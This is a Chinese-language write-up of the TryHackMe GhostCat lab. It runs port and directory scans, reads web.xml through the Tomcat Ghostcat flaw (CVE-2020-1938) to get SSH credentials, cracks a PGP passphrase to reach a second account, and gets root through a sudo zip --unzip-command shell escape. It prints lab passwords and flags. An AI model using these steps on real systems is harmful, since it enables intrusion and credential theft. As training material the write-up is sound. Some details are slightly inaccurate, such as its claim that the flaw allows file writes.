- THM GhostCat 渗透测试 Writeup

  **目标**: 10.48.160.191 - TryHackMe 靶场 (GhostCat)  
  **主机名**: ubuntu  
  **平台**: TryHackMe  
  **授权**: THM 授权靶场，全 IP 范围，无限制  
  **总耗时**: ~15 分钟  
  **完成日期**: 2026-06-11  

  ---

  ## 目录

  1. [信息搜集](#1-信息搜集)
  2. [服务识别](#2-服务识别)
  3. [Web 枚举](#3-web-枚举)
  4. [漏洞发现：Ghostcat (CVE-2020-1938)](#4-漏洞发现ghostcat-cve-2020-1938)
  5. [初始访问](#5-初始访问)
  6. [横向移动](#6-横向移动)
  7. [权限提升](#7-权限提升)
  8. [获取 Flags](#8-获取-flags)
  9. [攻击路径总结](#9-攻击路径总结)
  10. [发现的凭证](#10-发现的凭证)
  11. [技术要点](#11-技术要点)
  12. [渗透测试状态文件](#12-渗透测试状态文件)
  13. [靶机状态](#13-靶机状态)

  ---

  ## 1. 信息搜集

  ### 1.1 Nmap 端口扫描

  使用 nmap 对目标进行快速端口扫描，识别开放端口和服务版本。

  **命令：**
  ```bash
  nmap -sV -sC -O -T4 --top-ports 1000 10.48.160.191
  ```

  **结果：**
  ```
  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  53/tcp   open  domain  (generic dns response: SERVFAIL)
  8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
  8080/tcp open  http    Apache Tomcat 9.0.30
  ```

  **发现：**
  - 22/tcp: SSH 服务，OpenSSH 7.2p2，Ubuntu 系统
  - 53/tcp: DNS 服务，返回 SERVFAIL（异常）
  - 8009/tcp: AJP13 连接器，Apache Jserv v1.3
  - 8080/tcp: HTTP 服务，Apache Tomcat 9.0.30

  **关键推断：**
  - AJP13 (8009) + Tomcat 9.0.30 的组合是 Ghostcat 漏洞 (CVE-2020-1938) 的典型目标
  - Tomcat 管理面板可能存在于 /manager 或 /host-manager

  ---

  ## 2. 服务识别

  ### 2.1 Tomcat 版本确认

  通过访问 8080 端口确认 Tomcat 版本：

  ```bash
  curl -s http://10.48.160.191:8080 | head
  ```

  响应显示：**Apache Tomcat/9.0.30**

  ### 2.2 AJP13 端口确认

  8009 端口是 Tomcat 的 AJP13 连接器，用于与 Apache HTTP Server 或负载均衡器通信。

  **风险点：**
  - AJP13 端口暴露在公网，通常应该限制为本地访问
  - Tomcat 9.0.30 存在 CVE-2020-1938 (Ghostcat) 漏洞

  ---

  ## 3. Web 枚举

  ### 3.1 目录枚举

  使用 gobuster 对 Tomcat 8080 端口进行目录枚举：

  **命令：**
  ```bash
  gobuster dir -k -u http://10.48.160.191:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip -t 50
  ```

  **结果：**
  ```
  /docs (Status: 302) [Size: 0] [--> /docs/]
  /examples (Status: 302) [Size: 0] [--> /examples/]
  /favicon.ico (Status: 200) [Size: 21630]
  /host-manager (Status: 302) [Size: 0] [--> /host-manager/]
  /manager (Status: 302) [Size: 0] [--> /manager/]
  ```

  **发现：**
  - `/docs`: Tomcat 文档目录
  - `/examples`: Tomcat 示例应用
  - `/host-manager`: 虚拟主机管理面板（需要认证）
  - `/manager`: 应用管理面板（需要认证）

  **下一步推断：**
  - 管理面板需要认证，但 Ghostcat 漏洞可能绕过认证直接读取文件

  ---

  ## 4. 漏洞发现：Ghostcat (CVE-2020-1938)

  ### 4.1 漏洞描述

  **CVE-2020-1938** (Ghostcat) 是 Apache Tomcat AJP13 连接器的文件读取/包含漏洞。

  **影响版本：**

  - Apache Tomcat 6.x
  - Apache Tomcat 7.x < 7.0.100
  - Apache Tomcat 8.x < 8.5.51
  - Apache Tomcat 9.x < 9.0.31

  **目标版本：** Tomcat 9.0.30（受影响）

  **漏洞原理：**
  - AJP13 协议在处理某些请求时，未正确验证文件路径
  - 攻击者可以构造特殊请求，读取或写入服务器上的任意文件
  - 默认情况下，AJP13 端口 8009 监听所有接口

  ### 4.2 漏洞验证

  使用 Metasploit 的 Ghostcat 模块进行验证和利用：

  **命令：**
  ```bash
  msfconsole
  search CVE-2020-1938
  use auxiliary/admin/http/tomcat_ghostcat
  set RHOSTS 10.48.160.191
  set RPORT 8009
  set FILENAME /WEB-INF/web.xml
  run
  ```

  **结果：**
  ```
  [*] Running module against 10.48.160.191
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
           http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
           version="4.0"
           metadata-complete="true">
  
      <display-name>Welcome to Tomcat</display-name>
      <description>
          Welcome to GhostCat
          skyfuck:8730281lkjlkjdqlksalks
      </description>
  
  </web-app>
  ```

  **关键发现：**
  - web.xml 的 `<description>` 标签中硬编码了凭据：`skyfuck:8730281lkjlkjdqlksalks`
  - 用户名：skyfuck
  - 密码：8730281lkjlkjdqlksalks

  ---

  ## 5. 初始访问

  ### 5.1 SSH 登录

  使用从 web.xml 获取的凭据尝试 SSH 登录：

  **命令：**
  ```bash
  ssh skyfuck@10.48.160.191
  ```

  **密码：** `8730281lkjlkjdqlksalks`

  **结果：**
  ```
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
  skyfuck@ubuntu:~$ id
  uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
  ```

  **成功获取初始 shell！**

  ### 5.2 家目录枚举

  登录后枚举 skyfuck 的家目录：

  **命令：**
  ```bash
  ls -la
  ```

  **结果：**
  ```
  total 40
  drwxr-xr-x 3 skyfuck skyfuck 4096 Jun 10 23:25 .
  drwxr-xr-x 4 root root 4096 Mar 10 2020 ..
  -rw------- 1 skyfuck skyfuck 136 Mar 10 2020 .bash_history
  -rw-r--r-- 1 skyfuck skyfuck 220 Mar 10 2020 .bash_logout
  -rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10 2020 .bashrc
  drwx------ 2 skyfuck skyfuck 4096 Jun 10 23:25 .cache
  -rw-rw-r-- 1 skyfuck skyfuck 394 Mar 10 2020 credential.pgp
  -rw-r--r-- 1 skyfuck skyfuck 655 Mar 10 2020 .profile
  -rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10 2020 tryhackme.asc
  ```

  **关键发现：**
  - `credential.pgp`: PGP 加密文件，可能包含其他凭据
  - `tryhackme.asc`: ASCII 文本文件，可能是 PGP 公钥/私钥

  ### 5.3 文件类型确认

  **命令：**
  ```bash
  file credential.pgp tryhackme.asc
  ```

  **结果：**
  ```
  credential.pgp: data
  tryhackme.asc: ASCII text, with CRLF line terminators
  ```

  ---

  ## 6. 横向移动

  ### 6.1 PGP 私钥识别

  查看 tryhackme.asc 内容：

  **命令：**
  ```bash
  cat tryhackme.asc
  ```

  **结果：**
  ```
  -----BEGIN PGP PRIVATE KEY BLOCK-----
  Version: BCPG v1.63
  
  lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
  ...
  -----END PGP PRIVATE KEY BLOCK-----
  ```

  **发现：** 这是 PGP **私钥**！可以用来解密 credential.pgp。

  ### 6.2 导入私钥

  **命令：**
  ```bash
  gpg --import tryhackme.asc
  ```

  **结果：**
  ```
  gpg: key C6707170: secret key imported
  gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
  gpg: Total number processed: 2
  gpg: imported: 1
  gpg: secret keys imported: 1
  ```

  ### 6.3 尝试解密

  **命令：**
  ```bash
  gpg --decrypt credential.pgp
  ```

  **结果：**
  ```
  You need a passphrase to unlock the secret key for
  user: "tryhackme <stuxnet@tryhackme.com>"
  1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
  
  gpg: gpg-agent is not available in this session
  Enter passphrase:
  ```

  需要 passphrase 才能解锁私钥。

  ### 6.4 本地破解 Passphrase

  将私钥复制到本地，使用 john 破解 passphrase：

  **命令（本地）：**
  ```bash
  # 从目标复制私钥
  scp skyfuck@10.48.160.191:~/tryhackme.asc ./
  
  # 提取 john hash
  gpg2john tryhackme.asc > tryhackme.john
  
  # 使用 john 破解
  john tryhackme.john --wordlist=/usr/share/wordlists/rockyou.txt
  ```

  **结果：**
  ```
  Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
  alexandru (tryhackme)
  1g 0:00:00:00 DONE
  ```

  **Passphrase:** `alexandru`

  ### 6.5 解密凭据

  使用破解的 passphrase 解密 credential.pgp：

  **命令：**
  ```bash
  gpg --decrypt credential.pgp
  # 输入 passphrase: alexandru
  ```

  **结果：**
  ```
  merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
  ```

  **新凭据：**
  - 用户名：merlin
  - 密码：asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

  ### 6.6 切换用户

  使用新凭据切换到 merlin 用户：

  **命令：**
  ```bash
  su merlin
  ```

  **结果：**
  ```
  merlin@ubuntu:/home/skyfuck$ cd /home/merlin/
  merlin@ubuntu:~$ ls -la
  ```

  **成功横向移动到 merlin 用户！**

  ---

  ## 7. 权限提升

  ### 7.1 sudo 权限检查

  **命令：**
  ```bash
  sudo -l
  ```

  **结果：**
  ```
  User merlin may run the following commands on ubuntu:
      (root : root) NOPASSWD: ***
  ```

  **发现：**
  - merlin 可以 NOPASSWD 执行 `/usr/bin/zip` 作为 root
  - 这是 GTFOBins 中已知的提权路径

  ### 7.2 zip 提权原理

  zip 命令的 `--unzip-command` 或 `-T` 参数可以执行任意命令：

  - `-T` 参数：测试归档完整性，可以指定测试命令
  - `--unzip-command` 参数：指定解压命令
  - 配合 sudo，可以 root 权限执行任意命令

  ### 7.3 提权执行

  **命令：**
  ```bash
  sudo zip /tmp/test.zip /home/merlin/user.txt -T --unzip-command="sh -c '/bin/bash'"
  ```

  **结果：**
  ```
   adding: home/merlin/user.txt (stored 0%)
  root@ubuntu:~#
  ```

  **成功获取 root shell！**

  ---

  ## 8. 获取 Flags

  ### 8.1 User Flag

  **路径：** `/home/merlin/user.txt`

  **命令：**
  ```bash
  cat /home/merlin/user.txt
  ```

  **结果：**
  ```
  THM{GhostCat_1s_so_cr4sy}
  ```

  ### 8.2 Root Flag

  **路径：** `/root/root.txt`

  **命令：**
  ```bash
  cat /root/root.txt
  ```

  **结果：**
  ```
  THM{Z1P_1S_FAKE}
  ```

  ---

  ## 9. 攻击路径总结

  ```
  信息搜集 (Nmap)
    → 发现端口 22/53/8009/8080
    → 识别 Tomcat 9.0.30 + AJP13
  
  Web 枚举 (gobuster)
    → 发现 /manager, /host-manager, /docs, /examples
  
  漏洞利用 (Ghostcat CVE-2020-1938)
    → MSF auxiliary/admin/http/tomcat_ghostcat
    → 读取 /WEB-INF/web.xml
    → 获取凭据: skyfuck:8730281lkjlkjdqlksalks
  
  初始访问 (SSH)
    → ssh skyfuck@10.48.160.191
    → 登录成功
  
  发现 PGP 文件
    → credential.pgp (加密)
    → tryhackme.asc (私钥)
  
  PGP 私钥破解
    → john + gpg2john
    → 破解 passphrase: alexandru
    → 解密 credential.pgp
    → 获取凭据: merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
  
  横向移动
    → su merlin
    → 获取 user.txt: THM{GhostCat_1s_so_cr4sy}
  
  权限提升
    → sudo -l (发现 NOPASSWD: ***
    → sudo zip --unzip-command="sh -c '/bin/bash'"
    → 获取 root shell
    → 获取 root.txt: THM{Z1P_1S_FAKE}
  ```

  ---

  ## 10. 发现的凭证

  | 服务     | 用户名    | 密码                                                         | 来源                |
  | -------- | --------- | ------------------------------------------------------------ | ------------------- |
  | SSH      | skyfuck   | 8730281lkjlkjdqlksalks                                       | web.xml (Ghostcat)  |
  | PGP 私钥 | tryhackme | alexandru                                                    | john 破解           |
  | 系统     | merlin    | asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j | credential.pgp 解密 |

  ---

  ## 11. 技术要点

  ### 11.1 Ghostcat (CVE-2020-1938)

  - **漏洞类型**: 文件读取/包含 (LFI/RFI)
  - **影响组件**: Apache Tomcat AJP13 连接器
  - **利用方式**: 构造特殊 AJP13 请求，读取服务器上的任意文件
  - **修复建议**: 
    - 升级 Tomcat 到 9.0.31+ 或 8.5.51+
    - 限制 AJP13 端口仅监听本地 (127.0.0.1)
    - 如果不需要 AJP，禁用 AJP 连接器

  ### 11.2 PGP 私钥破解

  - **工具**: john + gpg2john
  - **原理**: 提取 PGP 私钥的 hash，使用字典攻击破解 passphrase
  - **防护建议**: 
    - 使用强 passphrase（12+ 字符，混合大小写、数字、符号）
    - 不要将私钥和密码存储在同一系统

  ### 11.3 sudo zip 提权

  - **漏洞类型**: 不安全的 sudo 配置
  - **影响**: zip 命令的 `--unzip-command` 参数可执行任意命令
  - **修复建议**: 
    - 不要给 zip 命令 sudo 权限
    - 使用更严格的命令白名单
    - 考虑使用 sudoers 的 Cmnd_Alias 限制参数

  ---

  ## 12. 靶机状态

  - **状态**: ✅ 全部完成
  - **获取 Flags**: 2/2 (user.txt + root.txt)
  - **总耗时**: ~15 分钟
  - **难度**: 中等
  - **主要漏洞**: CVE-2020-1938 (Ghostcat) + 不安全的 sudo 配置

  